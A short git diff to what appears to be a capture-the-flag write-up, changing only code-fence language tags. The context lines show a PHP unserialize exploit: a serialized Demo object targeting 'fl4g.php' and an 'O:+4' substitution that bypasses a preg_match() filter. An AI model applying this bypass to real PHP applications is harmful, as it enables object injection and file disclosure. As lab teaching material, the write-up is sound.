@@ -16,7 +16,7 @@
   -
 1. **Bypass unserialize**
   - Create object serialize:
-  ```
+  ```php
   $a = new Demo("fl4g.php");
   $ser = serialize($a);
   echo $ser;
@@ -28,7 +28,7 @@
   //O:4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
   ```
 2. **Bypass filter `preg_match()`**
-  ```
+  ```php
   $ser = str_replace('O:4', 'O:+4', $ser);
   //O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
   ```
